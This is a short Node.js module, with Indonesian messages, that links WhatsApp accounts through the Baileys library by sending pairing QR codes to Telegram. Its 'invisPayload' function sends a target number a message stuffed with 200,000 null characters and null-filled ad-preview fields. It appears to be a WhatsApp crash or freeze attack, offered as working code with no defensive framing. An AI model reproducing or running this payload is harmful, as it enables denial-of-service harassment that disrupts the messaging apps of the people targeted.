const { makeWASocket, useSingleFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const fs = require('fs');
const qrcode = require('qrcode');

const sessionsDir = './sessions';
if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir);

const clients = {};

async function createConnection(nomor, onQR) {
  const sessionPath = `${sessionsDir}/${nomor}.json`;
  const { state, saveState } = useSingleFileAuthState(sessionPath);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false
  });

  sock.ev.on('creds.update', saveState);
  sock.ev.on('connection.update', (update) => {
    const { qr } = update;
    if (qr && onQR) {
      qrcode.toDataURL(qr, (err, url) => {
        if (!err) onQR(url);
      });
    }
  });

  clients[nomor] = sock;
  return sock;
}

async function startPairing(nomor, sendQRToTelegram) {
  const sessionPath = `${sessionsDir}/${nomor}.json`;
  if (fs.existsSync(sessionPath)) return '✅ Sudah dipair sebelumnya.';
  await createConnection(nomor, sendQRToTelegram);
  return '📲 QR code telah dikirim. Scan sekarang.';
}

async function invisPayload(nomor) {
  const sock = clients[nomor];
  if (!sock) throw new Error("Belum terkoneksi ke nomor ini.");

  const target = nomor + '@s.whatsapp.net';
  const nullChar = '\u0000';
  const message = {
    text: nullChar.repeat(200000),
    contextInfo: {
      mentionedJid: [target],
      externalAdReply: {
        showAdAttribution: true,
        title: nullChar.repeat(10000),
        body: nullChar.repeat(10000),
        previewType: "PHOTO",
        mediaType: 1,
        thumbnail: Buffer.from(nullChar.repeat(10000)),
        sourceUrl: "https://wa.me/"
      }
    }
  };

  await sock.sendMessage(target, message);
}

module.exports = { startPairing, invisPayload };
